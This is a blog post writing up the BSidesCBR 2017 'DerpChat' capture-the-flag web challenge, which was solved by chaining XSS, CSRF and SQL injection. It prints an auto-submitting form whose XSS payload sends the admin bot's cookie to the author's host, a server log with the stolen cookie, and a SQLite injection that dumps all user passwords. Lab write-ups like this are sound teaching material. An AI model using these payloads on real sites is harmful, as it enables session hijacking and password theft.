
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>BSidesCBR 2017 CTF Write-Up: DerpChat - PaulSec's blog</title>
  <meta name="author" content="Paul A. (PaulSec)">

  
  <meta name="description" content="Hey there, Following my serie of write-ups for the BSidesCBR challs, I will discuss the DerpChat one. The instructions for this challenge were: 1
2 &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://paulsec.github.io/blog/2017/05/07/bsidescbr-2017-ctf-write-up-derpchat">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="PaulSec's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href='http://fonts.googleapis.com/css?family=Quattrocento+Sans|Roboto:400,300' rel='stylesheet' type='text/css'>

  

</head>


<body>
	<div class="container">
		<aside class="left">
			<div class="inner-left">
				<header>
					
  <img src="http://www.gravatar.com/avatar/0b0f4cb32c81edd3e8dca37bde08910c?s=200" alt="Gravatar of Paul A. (PaulSec) " title="Gravatar of Paul A. (PaulSec)" class="profilepic" />

<hgroup>
  <h1><a href="/">PaulSec's blog</a></h1>
  
    <h2 class="subtitle">Security, Tips & Lulz.</h2>
   
</hgroup>


				</header>
				<footer>
					<p>
	
	
</p>
				</footer>
			</div>
		</aside>
    	<section class="right">
    		<div class="inner-right">
    			<div id="posts">
    			  	<article class="post">
    
  <header>
    
      <h1 class="entry-title">BSidesCBR 2017 CTF Write-Up: DerpChat</h1>
    
    
      <p class="meta">
        








  


<time datetime="2017-05-07T11:28:21+02:00" pubdate data-updated="true">May 7<span>th</span>, 2017</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Hey there,</p>

<p>Following my serie of write-ups for the BSidesCBR challs, I will discuss the <a href="https://github.com/OJ/bsides-2017-ctf-docker/tree/master/web-derpchat">DerpChat</a> one.</p>

<p>The instructions for this challenge were:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>This web-based challenge was worth 275 points.
</span><span class='line'>Run docker-compose up and then browse to https://web.shell.dance:4443/.</span></code></pre></td></tr></table></div></figure>


<p>After browsing to <code>https://web.shell.dance:4443/</code>, I arrived on a registration/login page.
I registered the account test/test and I finally got a page with two inputs:
&ndash; One too search some messages I suppose
&ndash; And one in the middle of the page stating: &ldquo;Hello, could you please send me the link I was after?&rdquo;.</p>

<p>Moreover, a link to some kind of administration interface was forbidden (since I were simple user) and I guessed that the flag was landing there.</p>

<p>After a bit of experiments, I realized that: by sending a link to the second input, a simulated user (using PhantomJS) was browsing to the link we submitted. Now comes the fun part. Since I controlled the link the user was browsing to, I only had to chain this with an other vulnerability to (for example) steal the user cookie?</p>

<p>Bingo, it turns out the first form is vulnerable to Cross-Site Scripting.
So the scenario I now had in mind was:</p>

<ul>
<li>Create a HTML file that exploits the XSS and sends me back the admin&rsquo;s cookie.</li>
<li>Host it locally (my local IP was: 10.0.0.1)</li>
<li>And finally send it through the DerpChat functionality</li>
<li>???</li>
<li>Continue the CTF :)</li>
</ul>


<p>The exploit was basically this one, extremely simple, just triggering a simple for to exploit the XSS and sends me back the cookie to my Apache server.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;https://web.shell.dance:4443/chat&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span> <span class="na">id=</span><span class="s">&quot;bla&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">&quot;search&quot;</span> <span class="na">value=</span><span class="s">&quot;&lt;script&gt;document.location=&#39;http://10.0.0.1/cookie?cookie=&#39;+document.cookie&lt;/script&gt;&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span><span class='line'><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;bla&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">()</span><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And&hellip; boom!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>10.0.0.53 - - [16/Apr/2017:22:40:02 +0100] &quot;GET /payload.html HTTP/1.1&quot; 200 540 &quot;-&quot; &quot;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.8 Safari/534.34&quot;
</span><span class='line'>10.0.0.53 - - [16/Apr/2017:22:40:02 +0100] &quot;GET /cookie?cookie=DerpChat=FYrffsUmaavnBjWHMXGaFGALwtHVUsUmGuRnFgOLGUMBJoGCdMFpdifTiPObbOyAlBfNFsntkjyNxjWxspjQpBxnpzmWYkkErtuwLtZVjSbMUBwaWbRnQcKsKIQZPVmcwKUIUMpfYDwTfbRFfiCYcrEcdSWMKQjMVSqkKonwXBhCuzDtBZnHjMOtZmJedUzxrhgKusjmOLZlSbeHyNrSNaZVktZOBNroEbHBLQGCMmwGdAHPjLFUgOGlOUaBIthfqgIrpWnUuVJiQqxgeAplCNzDvVbTOsZfdcanPiehcKaWjXooJecnNAAVFSQLHenaNmdXSxsfGxCXiZREjLIdWacPnqDQbGeufRtgVoAsfQiUfLiHghsSfuNuennPhEPKsWkkHVgaTcxSdCSYTwtprLBLULVHgfqpHHKRmFqrDqsVIjPcZUiyWfmtJtmjHFunknPTCqIzEYomxhzpIQjLzLHUXsMyUPuNaOJwgtGbxOeTPjddVQgHYllKbOdyKSCb HTTP/1.1&quot; 404 498 &quot;-&quot; &quot;Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) CasperJS/1.1.0-beta3+PhantomJS/1.9.8 Safari/534.34&quot;
</span></code></pre></td></tr></table></div></figure>


<p>After grabbing the admin&rsquo;s cookie, I just replaced it in my browser and managed to get access to the admin interface.</p>

<p>There, I finally got access to the administration interface (yay!) and the functionality was some kind of &lsquo;User Management&rsquo; utility.
I got the point (based on the error messages) that there was a SQL injection and the DBMS was SQLite. Morever, during the recon, I managed to retrieve the name of a table: <code>Users</code> (important point).</p>

<p>In case you encounter SQLite in the back-end, I definitely recommend this <a href="http://atta.cked.me/home/sqlite3injectioncheatsheet">Cheat Sheet</a>.</p>

<p>Thanks to OJ that I pinged on Twitter and his &ldquo;hindsight&rdquo;, I finally got the SQLi working, dumping out the flag by concatenating all the user&rsquo;s passwords:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>&#39; || (select group_concat(Password) from Users) || &#39;
</span></code></pre></td></tr></table></div></figure>


<p>This gave us the following output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>FLAG,LMZqNQlADkoebSGEULvZSFdFVTgsFFhe,BSIDES_CTF{w3b_app5_r_hard_am_1_r1ght},test,test
</span></code></pre></td></tr></table></div></figure>


<p>Bingo, we got the flag!
This chall was really interesting, and chaining Client-side vulnerabilities (Cross-Site Scripting, CSRF) and finally SQLi to grab the flag was fun.</p>
</div>


</article>


        <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://paulsec.github.io/blog/2017/05/07/bsidescbr-2017-ctf-write-up-derpchat/" data-via="" data-counturl="http://paulsec.github.io/blog/2017/05/07/bsidescbr-2017-ctf-write-up-derpchat/" >Tweet</a>
  
  
  
</div>





    			</div>
    			<footer id="footer">
    				<p class="credit">
  Copyright &copy; 2017 - Paul A. (PaulSec). Powered by <a href="http://octopress.org">Octopress</a>
</p>


    			</footer>
    			







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




<link href='http://fonts.googleapis.com/css?family=Quattrocento+Sans|Roboto:400,300' rel='stylesheet' type='text/css'>





    		</div>
    	</section>
  	</div>
</body>
</html>
